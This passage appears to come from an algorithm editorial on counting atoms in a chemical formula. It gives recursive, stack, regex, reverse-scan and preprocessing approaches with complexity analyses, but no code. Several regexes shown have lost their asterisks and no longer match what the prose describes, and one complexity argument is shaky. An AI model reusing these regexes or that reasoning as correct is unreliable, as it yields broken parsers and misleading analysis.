<p>U: Yes, it should be a UPPERCASE LETTER.</p> <p>L: No, an atom cannot start with a lowercase letter.</p> <p>D: No, an atom cannot start with a digit.</p> <p>(: Yes, it can be a left parenthesis. However, in this case, we again need to recursively parse the formula inside the parenthesis, until the corresponding right parenthesis is found.</p> <p>): No, a formula cannot start with a right parenthesis. However, it is important since it signifies the end of a nested formula.</p> <p>What should we return after parsing the formula? Any data structure that stores the (atom, count) as (key, value) pair. The data structure should be able to handle multiple atoms with their counts. A dictionary in Python, HashMap in Java, or unordered_map in C++ can be used.</p> <p>Let's dive more into the nitty-gritty of the implementation. Since we are using the index as the input parameter, our entire decision-making will be based on the character at the index. The character can be of five types, as defined in the Overview. Assuming our parsing is correct up to this index, the decision cases can be as follows.</p> <p>U: It signifies the beginning of another atom. Thus, we need to reset our curr_atom variable in which we will save the current atom.</p> <p>Before resetting, we need to check if the curr_atom is empty or not. If it is not empty, we need to save/add the count of the curr_atom in the local dictionary curr_map created for the current formula. If the variable curr_count is empty, we will take the count as 1. If it is not empty, we will take the count as curr_count.</p> <p>After saving the curr_atom and curr_count in curr_map, we will reset the curr_count to an empty string and curr_atom to the current UPPERCASE LETTER.</p> <p>L: It is the continuation of the current atom. We will append the lowercase letter to the curr_atom.</p> <p>D: It signifies the count of the current atom. We will append the digit to the curr_count.</p> <p>(: It signifies the beginning of a nested formula. We will recursively parse the formula inside the parentheses. The result of the nested formula will be added to the curr_map.</p> <p>): It signifies the end of a nested formula. The last saved curr_atom and curr_count should be saved in the curr_map.</p> <p>Should we return curr_map right away? No, we need to multiply the multiplicity of the nested formula by the count of the atoms in the nested formula. For this, we will scan the digits after the right parentheses and save them in multiplier. If the multiplier is not empty, we will multiply the count of the atoms in the curr_map with the multiplier and return the curr_map.</p> <p>We are not returning the index in the recursive function. However, there is a workaround. We can use a global variable index which will be updated in the recursive function. Hence, at any point in time, the index will point to the character that we are currently parsing.</p> <p>We are doing recursion, so we need a base case. What can be the base case? Well, the base case can be when the index is equal to the length of the formula. In this case, we need to save the curr_atom and curr_count in the curr_map and return the curr_map.</p> <p>Additional Information: Recursive Descent Parser is a top-down parser that recursively parses the input. However, it may not be the best choice for parsing complex grammars.</p> <p>If the grammar is unambiguous and the grammar is LL(1) (Left-to-right, Leftmost derivation, 1 lookahead), then a Recursive Descent Parser is a good choice.</p> <p>For our formula, we can have the following grammar.</p> <p>F\u2192SF\u2223\u03f5 S\u2192(F)D\u2223AD A\u2192U\u2223UL D\u2192DD\u2223\u03f5 U\u2192A\u2223B\u2223C\u2223\u2026\u2223Z L\u2192a\u2223b\u2223c\u2223\u2026\u2223z D\u21920\u22231\u22232\u2223\u2026\u22239 Here, terminals are (, ), A, B, C, \u2026, Z, a, b, c, \u2026, z, 0, 1, 2, \u2026, 9.</p> <p>The above grammar is Context Free Grammar (Type-2 in Chomsky Hierarchy). It can be recognized by Pushdown Automata, which uses a stack to track nested parenthesis. This fact will be mildly used in next approach.</p> <p>We need to sort the map with respect to the atoms. This can be done using the built-in sorting functions of the programming language.</p> <p>Finally, we need to generate the answer string. We will iterate over the sorted map and append the atom to the answer string. If the count of the atom is greater than 1, we will append the count of the atom to the answer string.</p> <p>With all the information in hand, let's implement the solution.</p> <p>Algorithm</p> <p>Define a global variable index and set it to 0. It will be used to keep track of the current index in the formula.</p> <p>Define a recursive function parse_formula() which will return a dictionary containing the count of atoms in the formula.</p> <p>Define a hashmap curr_map which will store the count of atoms in the current formula.</p> <p>Define two strings curr_atom and curr_count which will store the current atom and count. Both will be initialized to an empty string.</p> <p>Using the global variable index, iterate over the characters of the formula.</p> <p>If the character at the current index is an UPPERCASE LETTER:</p> <p>Save the previous atom and count in the curr_map if it exists.</p> <p>Update the curr_atom to the current UPPERCASE LETTER and curr_count to an empty string.</p> <p>If the character at the current index is a lowercase letter, append the lowercase letter to the curr_atom.</p> <p>If the character at the current index is a digit, append the digit to the curr_count.</p> <p>If the character at the current index is a left parenthesis:</p> <p>Increment the index, and parse the formula inside the parenthesis by recursively calling the parse_formula() function. Store the result in a hashmap nested_map.</p> <p>Add the count of atoms in the nested_map to the curr_map.</p> <p>If the character at the current index is a right parenthesis:</p> <p>Save the previous atom and count in the curr_map if it exists.</p> <p>Find the integer multiplier after the right parenthesis and store it in a string multiplier. If the multiplier is not empty, multiply the count of atoms in the curr_map with the multiplier.</p> <p>Return the curr_map. Ensure that index points to the first non-digit character after the right parenthesis.</p> <p>Before returning the curr_map, save the last atom and count in the curr_map if it exists. Return the curr_map.</p> <p>Parse the formula using the parse_formula() function and store the result in final_map.</p> <p>Sort the final_map with respect to the atoms (which are the keys of the map).</p> <p>Generate the answer string ans by iterating over the sorted map. Append the atom to the ans. If the count of the atom is greater than 1, append the count of the atom to the ans.</p> <p>Return the ans.</p> <p>Implementation</p> <p>Implementation Note: Let's implement the above idea slightly differently. In the code, we can see that we return the curr_map if formula[index] is ')'. This we can merge with the last return statement. Moreover, whenever we encounter a UPPERCASE LETTER, we can find corresponding lowercase letters and digits in one go.</p> <p>Task: Global variables are not recommended in programming. Readers are encouraged to implement and comment below their recursive solution without using global variables.</p> <p>Complexity Analysis</p> <p>Let N be the length of the formula.</p> <p>Time complexity: O(N  2  )</p> <p>The recursive function parse_formula() will be called O(N) times.</p> <p>However, we are iterating over the atoms of the nested formula to add the count to the current formula. This will take time equal to the number of atoms in the nested formula. The number of atoms in the nested formula can be equal to O(N). Thus, the time complexity of the recursive function will be O(N  2  ).</p> <p>One such example of worst case is (A(B(C(D(E(F(G(H(I(J(K(L(M(N(O(P(Q(R(S(T(U(V(W(X(Y(Z)2)2)2)2)2)2)2)2)2)2)2)2)2)2)2)2)2)2)2)2)2)2)2)2)2). In this case, whenever we encounter a right parenthesis, we will have to iterate over all the atoms in the nested formula to add the count to the current formula.</p> <p>In actual it is O(PN) where P is the number of paranthese pairs. Here P can be at most N/2, or P=O(N). However, P is not a function of input size. Hence, we shouldn't consider it in the time complexity.</p> <p>Sorting will take O(NlogN) time. This may vary depending on the implementation of the sorting algorithm in the programming language. Generating the answer string will take O(N) time.</p> <p>Hence, the overall time complexity will be O(N  2  ).</p> <p>Space complexity: O(N)</p> <p>The space complexity will be O(N) due to the space used by the recursive function call stack.</p> <p>The space used by the final_map will be O(N). Moreover, we are sorting the final_map. In sorting, some extra space is used. The space complexity depends on the implementation of the sorting algorithm in the programming language, but it will be O(N).</p> <p>The space used by the answer string ans will be O(N).</p> <p>Hence, the overall space complexity will be O(N).</p> <p>Approach 2: Stack</p> <p>Intuition</p> <p>The Approach 1 uses recursion to parse the formula. The recursion is a powerful tool to solve problems where the structure of the input is recursive. Recursion internally uses a stack to keep track of the function calls.</p> <p>Unfolding a recursion can be done by replacing the role of the system call stack. At each occurrence of recursion, we push the parameters as a new element into the data structure that we created, instead of invoking a recursion. More details can be found in Recursion explore card</p> <p>Stack is a linear data structure that follows the Last In First Out (LIFO) principle. To understand the stack in depth, it is advised to visit Stack explore card.</p> <p>In this approach, we will unfold the recursion using a stack. Instead of making a recursive call to parse the formula inside the parenthesis, we will use a stack to keep track of the atoms and their counts of the nested formula. The result of the nested formula will be added to the current formula (which itself may be a nested formula for some other formula).</p> <p>Hence, in the stack, our initial top element would be an empty hashmap. It will store the final count of atoms in the formula.</p> <p>We will populate the hashmap as we parse the formula. When we encounter a left parenthesis, we will push another empty hashmap to the stack. It will store the count of atoms in the nested formula. When we encounter the corresponding right parenthesis, we will pop the top element from the stack, multiply the count with the multiplicity of the nested formula, and add the count to the current formula (which would then be on the top of the stack).</p> <p>Since each left parenthesis will have a corresponding right parenthesis, in the end, the stack will have only one element (which we pushed initially). This element will contain the total count of atoms in the formula.</p> <p>Additional Information: As mentioned in the intuition of Approach 1, the grammar of the formula can be recognized by Pushdown Automata, which uses a stack. Hence, this approach is inspired by pushdown automata.</p> <p>The following animation visualizes the intuition for the input \"Na2ZnRb5(PuS11(SH)6W)2(H2S)Unu8Pu\"</p> <p>Current</p> <p>Readers are encouraged to implement the solution on their own.</p> <p>Algorithm</p> <p>Initialize a stack stack. The top element of the stack will be an empty hashmap. It will store the count of atoms in the formula.</p> <p>Initialize the integer index to 0. It will keep track of the current character in the formula.</p> <p>Iterate over the characters of the formula using the index index.</p> <p>If the character at the current index is a left parenthesis, push an empty hashmap to the stack. It will store the count of atoms in the nested formula.</p> <p>If the character at the current index is a right parenthesis, pop the top element from the stack.</p> <p>Find the multiplier after the right parenthesis and store it in multiplier. If the multiplier is not empty, multiply the count of atoms in the popped hashmap with the multiplier.</p> <p>Add the count of atoms in the popped hashmap to the hashmap which is on the top of the stack.</p> <p>Otherwise, it should be a UPPERCASE LETTER. Extract the complete atom with frequency and add it to the hashmap which is on the top of the stack.</p> <p>Sort the hashmap which is on the top of the stack using the keys.</p> <p>Generate the answer string ans by iterating over the sorted hashmap. Append the atom to the ans. If the count of the atom is greater than 1, append the count of the atom to the ans.</p> <p>Return the ans.</p> <p>Implementation</p> <p>Complexity Analysis</p> <p>Let N be the length of the formula.</p> <p>Time complexity: O(N  2  )</p> <p>The stack will have at most O(N) elements. Each element will be popped and pushed at most once. However, since we need to revisit the atoms in the nested formula to add the count to the current formula, in the worst case, the time complexity of the stack operations will be O(N  2  ).</p> <p>Sorting will take O(NlogN) time. This may vary depending on the implementation of the sorting algorithm in the programming language. Generating the answer string will take O(N) time.</p> <p>Hence, the overall time complexity will be O(N  2  ).</p> <p>Space complexity: O(N)</p> <p>The space used by the stack will be O(N).</p> <p>The space used by the final_map will be O(N). Moreover, we are sorting the final_map. In sorting, some extra space is used. The space complexity depends on the implementation of the sorting algorithm in the programming language. However, it will be O(N).</p> <p>The space used by the answer string ans will be O(N).</p> <p>Hence, the overall space complexity will be O(N).</p> <p>Approach 3: Regular Expression</p> <p>Intuition</p> <p>In this problem, we are parsing a string to extract the atoms and their counts. Parsing is often associated with regular expressions. Regular expressions are a powerful tool to match patterns in strings.</p> <p>Regular Expression is a sequence of characters that define a search pattern. It is used to match character combinations in strings. To understand regular expressions in depth, readers can solve Regular Expression Matching problem.</p> <p>To understand the regular expression more formally, readers can visit Wikipedia</p> <p>Let's understand a few examples of regular expressions used in daily life.</p> <p>Dates can be matched using regular expressions. For example, a date in the format mm/dd/yyyy can be matched using the regular expression (0[1-9]|1[0-2])/(0[1-9]|[12][0-9]|3[01])/\\d{4}.</p> <p>(0[1-9] | 1[0-2]) signifies the month should be between 01 and 12. It briefly lists 01, 02, 03, 04, 05, 06, 07, 08, 09, 10, 11, and 12. The | signifies logical OR.</p> <p>(0[1-9] | [12][0-9] | 3[01]) signifies the day should be between 01 and 31. It briefly lists 01, 02, 03, 04, 05, 06, 07, 08, 09, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,</p> <p>\\d{4} signifies the year should be a 4-digit number. The \\d is used to match a digit, and {4} is used to convey that there should be exactly 4 digits.</p> <p>Phone Numbers can be matched using regular expressions. For example, a phone number in the format xxx-xxx-xxxx can be matched using the regular expression \\d{3}-\\d{3}-\\d{4}.</p> <p>Emails can be validated using ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+.[a-zA-Z]{2,}$ - To ensure a strong password we can use ^(?=.[a-z])(?=.[A-Z])(?=.\\d)(?=.[@$!%?&amp;])[A-Za-z\\d@$!%?&amp;]{8,}$. It will ensure that the password should have at least 8 characters, one UPPERCASE letter, one lowercase letter, one digit, and one special character.</p> <p>It is worth noting that in different programming languages, the syntax of regular expressions can vary. Hence, it is strongly advised to visit the official documentation of the programming language. Scroll down to implementation for language-specific notes.</p> <p>How is regular expression relevant to this problem?</p> <p>The atom along with its count is a regular expression</p> <p>It begins with an UPPERCASE LETTER, Followed by zero or more lowercase letters, Followed by zero or more digits. The regular expression will be UL  \u2217  D  \u2217  . In code, it will be [A-Z][a-z]\\d. Hence, we can extract the atom and their count using this regular expression.</p> <p>Since we want atoms and count separately, we will use two tuples. The first tuple will contain the atom and the second tuple will contain the count. It will be ([A-Z][a-z])(\\d).</p> <p>However, we didn't take into account the nestedness. For that, let's extract the parenthesis as well.</p> <p>The regular expression for the left parenthesis will be (. The regular expression for the right parenthesis followed by the multiplier will be ())(\\d*). The grouping ensures that we can extract the multiplier separately. Hence, we can scan these five entities (atom, count, left parenthesis, right parenthesis, and multiplier) in the formula using regular expressions.</p> <p>As done in stack approach, whenever we encounter a left parenthesis, we will push an empty hashmap to the stack. Whenever we encounter a right parenthesis, we will pop the top element from the stack, multiply the count with the multiplicity of the nested formula, and add the count to the current formula (which would then be on the top of the stack).</p> <p>Additional Information: In Approach 1, we mentioned that formula can be represented using Context Free Grammar (CFG).</p> <p>In this approach we are using regular expressions to parse the formula. Regular expressions can be represented using Regular Grammar.</p> <p>Regular Grammar (Type-3) is a subset of CFG (Type-2). It is less expressive than CFG. For CFG, we have pushdown automata, while for Regular Grammar, we have finite automata.</p> <p>We are using stack, then how is it different from Approach 2? In this approach, we won't be manually extracting atoms and counts, it will be done using regular expressions. We will be using stack only to ensure that the nested formula gets multiplied with the correct multiplicity.</p> <p>Algorithm</p> <p>Define a regular expression regex to extract the atom, count, left parenthesis, right parenthesis, and corresponding multiplier as quintuples. Deep dive into the documentation of your preferred programming language to formulate the required regular expression.</p> <p>Using regex, find all the occurrences of the quintuples in the formula. Store the result in matcher.</p> <p>Initialize a stack stack to keep track of the atoms and their counts. The top element of the stack will be an empty hashmap. It will store the count of atoms in the formula.</p> <p>The more the distance of the top element is from the bottom element, the more nested the formula is.</p> <p>Iterate over all the quintuples (atom, count, left, right, multiplier) in the parsed formula using the matcher.</p> <p>If the atom is not empty, then add it to the top hashmap of the stack. If the count is empty, the corresponding value will be incremented by 1. Otherwise, the corresponding value will be incremented by the count.</p> <p>Else if the left is not empty, push an empty hashmap to the stack. It signifies the beginning of a nested formula.</p> <p>Else if the right is not empty, pop the top element as curr_map from the stack. If the multiplier is not empty, multiply the count of atoms in the curr_map with the multiplier.</p> <p>Add the count of atoms in the curr_map to the hashmap which is on the top of the stack.</p> <p>Sort the hashmap which is on the top of stack using the keys.</p> <p>Generate the answer string ans by iterating over the sorted hashmap. Append the atom to the ans. If the count of the atom is greater than 1, append the count of the atom to the ans.</p> <p>Return the ans.</p> <p>Implementation</p> <p>Implementation Note: Ensure that the regular expression is correct, and doesn't include any extra spaces. Moreover, it is strongly advised to visit the official documentation to understand the nitty-gritty of regular expressions in the programming language.</p> <p>For Python, readers can visit the documentation of re module. For Java, readers can visit the documentation of Pattern class. For C++, readers can visit documentation of regex library. Complexity Analysis</p> <p>Let N be the length of the formula.</p> <p>Time complexity: O(N  2  )</p> <p>Parsing the regex in the formula will take O(N) time.</p> <p>There will be at most O(N) quintuples in the matcher. Now, since for the right parenthesis, we need to revisit the atoms in the nested formula to add the count to the current formula, in the worst case, the time complexity of the stack operations will be O(N  2  ).</p> <p>Sorting will take O(NlogN) time. This may vary depending on the implementation of the sorting algorithm in the programming language.</p> <p>Generating the answer string will take O(N) time.</p> <p>Hence, the overall time complexity will be O(N  2  ).</p> <p>Space complexity: O(N)</p> <p>There will be at most O(N) quintuples in the matcher.</p> <p>The space used by the stack will be O(N).</p> <p>The space used by the final_map will be O(N). Moreover, we are sorting the final_map. In sorting, some extra space is used. The space complexity depends on the implementation of the sorting algorithm in the programming language. However, it will be O(N).</p> <p>The space used by the answer string ans will be O(N).</p> <p>Hence, the overall space complexity will be O(N).</p> <p>Approach 4: Reverse Scanning</p> <p>Intuition</p> <p>In all the approaches we have discussed so far, whenever we encounter a right parenthesis, we need to traverse backward (in a way) to ensure that multiplicity is applied to the atoms in the nested formula.</p> <p>This is primarily because we get to know about the multiplicity of the nested formula only after the end of the nested formula. Hence, we need to revisit the atoms in the nested formula to apply the multiplicity.</p> <p>What if we could know the multiplicity of the nested formula in the beginning itself? Then we can apply the multiplicity to the atoms as we parse them. This will eliminate the need to revisit the atoms in the nested formula.</p> <p>How can we know the multiplicity of the nested formula in the beginning itself? By traversing right-to-left, we can know the multiplicity of the nested formula in the beginning itself.</p> <p>As soon as we encounter a number followed by a right parenthesis, we can store the multiplicity. (Note that number followed by lowercase letter will be count, and not multiplicity)</p> <p>However, what if we encounter a left parenthesis? Then the most recent multiplicity will cease to exist. Accessing the most recent element can be done using the Last-in-First-Out (LIFO) principle. Hence, we can use a stack to store the multiplicity.</p> <p>To fasten the process, we can use an integer multiplier to store the current multiplier, which will be the product of all the multipliers in the stack. Initially, the multiplier will be 1.</p> <p>On encountering ), we need to multiply the multiplier with the just scanned multiplier. On encountering (, we need to divide the multiplier by the popped element from the stack. Readers are encouraged to implement the solution on their own. Plan all the cases that we need to take care of while scanning from right to left.</p> <p>It is worth noting that for forming atoms and count, we won't \"append\" the characters. Instead, we will \"prepend\" the characters. This is because we are scanning the formula in reverse. Moreover, a UPPERCASE LETTER signifies the end of the scanning of the atom and not the beginning.</p> <p>Algorithm</p> <p>Initialize the integer running_mul to 1. It will store the valid multiplier for atoms to be scanned.</p> <p>Initialize the stack stack to store the multipliers. Push 1 to the stack. The product of elements in the stack will be the valid multiplier for atoms to be scanned, which is also stored in running_mul.</p> <p>Initialize the hashmap final_map to store the count of atoms.</p> <p>Initialize the strings curr_atom and curr_count to store the current atom and count.</p> <p>Traverse right-to-left in the formula using the iterator index.</p> <p>If the character at the current index is a digit, prepend it to the curr_count.</p> <p>If the character at the current index is a lowercase letter, prepend it to the curr_atom.</p> <p>If the character at the current index is an UPPERCASE LETTER, prepend it to the curr_atom. Now, the curr_atom is complete.</p> <p>Add the curr_atom to the final_map. If the curr_count is not empty, the value of the curr_atom will be the product of curr_count and running_mul. Otherwise, the value of the curr_atom will be running_mul.</p> <p>Reset the curr_atom and curr_count.</p> <p>If the character at the current index is a right parenthesis, the curr_count, if any, will be considered as curr_multiplier. If curr_count is empty, curr_multiplier will be 1.</p> <p>Push the curr_multiplier to the stack.</p> <p>Multiply the running_mul by the curr_multiplier.</p> <p>Reset the curr_count.</p> <p>If the character at the current index is a left parenthesis, divide the running_mul by the popped element from the stack.</p> <p>Sort the final_map using the keys.</p> <p>Generate the answer string ans by iterating over the sorted final_map. Append the atom to the ans. If the count of the atom is greater than 1, append the count of the atom to the ans.</p> <p>Return the ans.</p> <p>The following animation visualizes the algorithm.</p> <p>Current</p> <p>Implementation</p> <p>Complexity Analysis</p> <p>Let N be the length of the formula.</p> <p>Time complexity: O(N  2  )</p> <p>Declaring and Initializing the variables before the while loop will take O(1) time.</p> <p>The while loop will run O(N) times. The number of steps in one while loop depends on the character at the current index.</p> <p>In the case of a digit, lowercase letter, or UPPERCASE LETTER, we are prepending the characters. Appending is O(1) operation, however, prepending is O(N) operation.</p> <p>s = s + a is different from s = a + s. The former can be augmented as s += a, while the latter can't be augmented.</p> <p>Although it may vary with programming language, in general, inserting at the end is O(1) operation, while inserting at the beginning is O(N) operation.</p> <p>The worst case example of this can be when the formula is \"Qabcdefghij\".</p> <p>In the case of the left parenthesis, we are converting the string curr_count to integer curr_multiplier. This may take O(N) time in the worst case. However, the amortized time complexity will be O(1).</p> <p>In the case of the right parenthesis, we are updating the running_mul and stack. This will take O(1) time.</p> <p>Hence, the time complexity of the while loop will be O(N  2  ).</p> <p>Sorting will take O(NlogN) time. This may vary depending on the implementation of the sorting algorithm in the programming language.</p> <p>Generating the answer string will take O(N) time.</p> <p>Hence, the overall time complexity will be O(N  2  ).</p> <p>Space complexity: O(N)</p> <p>The stack may have at most O(N) elements.</p> <p>The space used by the final_map will be O(N). Moreover, we are sorting the final_map. In sorting, some extra space is used. The space complexity depends on the implementation of the sorting algorithm in the programming language. However, it will be O(N).</p> <p>The space used by the ans will be O(N).</p> <p>The space used by the curr_atom and curr_count will be O(N).</p> <p>The space used by the running_mul will be O(1), since it is of integer type, which allocates fixed space.</p> <p>Hence, the overall space complexity will be O(N).</p> <p>Approach 5: Preprocessing</p> <p>Intuition</p> <p>In previous approach, the bottleneck in the while loop (as mentioned in the complexity analysis section) was</p> <p>Prepending the characters to curr_atom and curr_count was taking O(N) time.</p> <p>The alternative is to NOT prepend the characters. Instead, we can append the characters and reverse the string before using it. Since there will be at most O(N) characters in the string, reversing the string will take O(N) time. However, the amortized time complexity will be O(1). Readers are encouraged to implement the solution on their own and comment their implementation below.</p> <p>In this approach, we will pre-process the formula to make the left-to-right parsing easier. For every index, we will store the valid multiplier beforehand.</p> <p>Pre-processing is a common technique to make the actual processing easier.</p> <p>As done in Approach 4, we will use a stack to store the multipliers. We can use another array muls to store the valid multiplier for every index. After this pre-processing, we can traverse the formula left-to-right, and apply the multiplier to the atoms as we scan them. During left-to-right traversal, we can append the characters to curr_atom and curr_count, which is a constant time operation.</p> <p>Let's see if it helps in optimizing the runtime.</p> <p>Algorithm</p> <p>Initialize the array muls to store the valid multiplier for every index. Initialize the integer running_mul to 1. It will store the valid multiplier for atoms to be scanned.</p> <p>Initialize the stack stack to store the multipliers. Push 1 to the stack. The product of elements in the stack will be the valid multiplier for atoms to be scanned, which is also stored in running_mul.</p> <p>Initialize the empty string curr_number to store the current number.</p> <p>Do the pre-processing by traversing right-to-left in the formula using the iterator index, which is initialized to the formula.length() - 1.</p> <p>If the character at the current index is a digit, append it to the curr_number.</p> <p>If the character at the current index is a letter, it means the scanned number was count and not a multiplier. Discard the curr_number.</p> <p>If the character at the current index is a right parenthesis, the scanned number was multiplier. However, it was scanned in reverse.</p> <p>If curr_number is not empty, reverse it and convert it to an integer in the variable curr_multiplier. If it was empty, curr_multiplier will be 1.</p> <p>Multiply the running_mul by the curr_multiplier.</p> <p>Push the curr_multiplier to the stack.</p> <p>Reset the curr_number.</p> <p>If the character at the current index is a left parenthesis, the most recent multiplier will cease to exist. Hence, divide the running_mul by the popped element from the stack. Moreover, reset the curr_number.</p> <p>Append the running_mul to the muls.</p> <p>Reverse the muls.</p> <p>Initialize the hashmap final_map to store the count of atoms.</p> <p>Process the formula left-to-right using the iterator index, which is initialized to 0.</p> <p>If the character at the current index is a UPPERCASE LETTER, extract the entire atom and count (which by default should be 1). Add into the final_map the atom and count, multiplied by the valid multiplier at the current index.</p> <p>Sort the final_map using the keys.</p> <p>Generate the answer string ans by iterating over the sorted final_map. Append the atom to the ans. If the count of the atom is greater than 1, append the count of the atom to the ans.</p> <p>Return the ans.</p> <p>Here's how muls should look like for the input \"K4(ON(SO3)2)2\". The only values of muls we ultimately care about are</p> <p>On the last letter of the atom, if there is no associated number. On the last number of the digit followed by an atom. The remaining values are intermediate values that helped us in producing the values we care about.</p> <p>muls_array</p> <p>Implementation</p> <p>Implementation Note: In the above implementation</p> <p>We are reversing a string curr_number We are converting variables curr_number and curr_count to integer. We can avoid both of these if we form integers from characters as we scan them. This will need a little bit of Mathematics. Readers are encouraged to implement the solution on their own and comment their implementation below.</p> <p>Complexity Analysis</p> <p>Let N be the length of the formula.</p> <p>Time complexity: O(NlogN)</p> <p>The while loop of pre-processing will have O(N) iterations.</p> <p>When the current character is alphanumeric, or left parenthesis, the time complexity will be O(1).</p> <p>When the current character is a right parenthesis, the time complexity can be O(N) in the worst case, because of the string reversal and conversion to integer. However, the amortized time complexity will be O(1).</p> <p>Hence, the time complexity of pre-processing will be O(N).</p> <p>Reversing the muls will take O(N) time.</p> <p>The while loop of the processing will have O(N) iterations.</p> <p>Every character will be processed at most twice, once during extracting, and other during storing.</p> <p>Hence, the time complexity of the processing will be O(N).</p> <p>Sorting will take O(KlogK) time, where K is the number of unique atoms. In the worst case, K can be equal to N. It is worth noting that this may vary depending on the implementation of the sorting algorithm in the programming language.</p> <p>Generating the answer string will take O(N) time.</p> <p>Hence, the overall time complexity will be O(N+N+NlogN+N), which is O(NlogN).</p> <p>Space complexity: O(N)</p> <p>The space used by the muls will be O(N).</p> <p>The space used by the stack will be O(N).</p> <p>The space used by the final_map will be O(N). Moreover, we are sorting the final_map. In sorting, some extra space is used. The space complexity depends on the implementation of the sorting algorithm in the programming language. However, it will be O(N).</p> <p>The space used by the answer string ans will be O(N).</p> <p>Hence, the overall space complexity will be O(N).</p> <p>Approach 6: Reverse Scanning with Regex</p> <p>Intuition</p> <p>In Approach-4, the bottleneck in the while loop (as mentioned in the complexity analysis section) was</p> <p>Prepending the characters to curr_atom and curr_count was taking O(N) time.</p> <p>The purpose of prepending was to extract atoms and count. However, we have seen in Approach 3 that regular expressions can be used to extract atoms and counts.</p> <p>After extracting the atoms and counts, we can do reverse scanning to ensure that in each nested formula, the atoms are multiplied by the correct multiplicity. This approach is inspired by the same thought process.</p> <p>We have achieved O(NlogN) time complexity in Approach 5. Can we do better than this? Practically, it is difficult to achieve better time complexity than O(NlogN), because sorting will take at least O(NlogN) time. Since we have to sort the strings, the non-comparison based sorting algorithms (counting sort, radix sort, bucket sort) can't be used.</p> <p>Readers are encouraged to implement the solution on their own. It will be a combination of Approach 3 and Approach 4, but somewhat concise and optimized.</p> <p>Algorithm</p> <p>Define a regular expression regex to extract the atom, count, left parenthesis, right parenthesis, and corresponding multiplier as quintuples. Deep dive into the documentation of your preferred programming language to formulate the required regular expression.</p> <p>Using regex, find all the occurrences of the quintuples in the formula. Store the result in matcher, and reverse it.</p> <p>Initialize the hashmap final_map to store the count of atoms.</p> <p>Initialize the stack stack to keep track of the nested multiplicities. Push integer 1 to the stack.</p> <p>Initialize the integer running_mul to 1. It will store the valid multiplier for atoms to be scanned.</p> <p>Parse the formula by iterating over the matcher.</p> <p>If the current element is an atom, add it to the final_map.</p> <p>The value will be the product of the count and the running_mul. If the count is not present, the value will be 1 * running_mul.</p> <p>If the current element is a right parenthesis.</p> <p>If the multiplier is present, multiply the running_mul by the multiplier. Push the multiplier to the stack.</p> <p>If the multiplier is not present, push 1 to the stack.</p> <p>If the current element is a left parenthesis, divide the running_mul by the popped element from the stack.</p> <p>Sort the final_map using the keys.</p> <p>Generate the answer string ans by iterating over the sorted final_map. Append the atom to the ans. If the count of the atom is greater than 1, append the count of the atom to the ans.</p> <p>Return the ans.</p> <p>Implementation</p> <p>Complexity Analysis</p> <p>Let N be the length of the formula.</p> <p>Time complexity: O(NlogN)</p> <p>The time complexity of finding all the quintuples using regular expression will depend on the programming language. In general, it will be O(N).</p> <p>The time complexity of the for loop will be O(N).</p> <p>If atom, adding it to the final_map will take O(1) time.</p> <p>If the right parenthesis, multiplying the running_mul and pushing the multiplier to the stack will take O(1) time.</p> <p>If left parenthesis, dividing the running_mul by the popped element from the stack will take O(1) time.</p> <p>Hence, the time complexity of the for loop will be O(N).</p> <p>Sorting will take O(KlogK) time, where K is the number of unique atoms. In the worst case, K can be equal to N. It is worth noting that this may vary depending on the implementation of the sorting algorithm in the programming language.</p> <p>Generating the answer string will take O(N) time.</p> <p>Hence, the overall time complexity will be O(N+N+NlogN+N), which is O(NlogN).</p> <p>Space complexity: O(N)</p> <p>The space used by the quintuples will be O(N).</p> <p>The space used by the final_map will be O(N). Moreover, we are sorting the final_map. In sorting, some extra space is used. The space complexity depends on the implementation of the sorting algorithm in the programming language. However, it will be O(N).</p> <p>The space used by the answer string ans will be O(N).</p> <p>The space used by the stack will be O(N).</p> <p>Hence, the overall space complexity will be O(N).</p>"}]}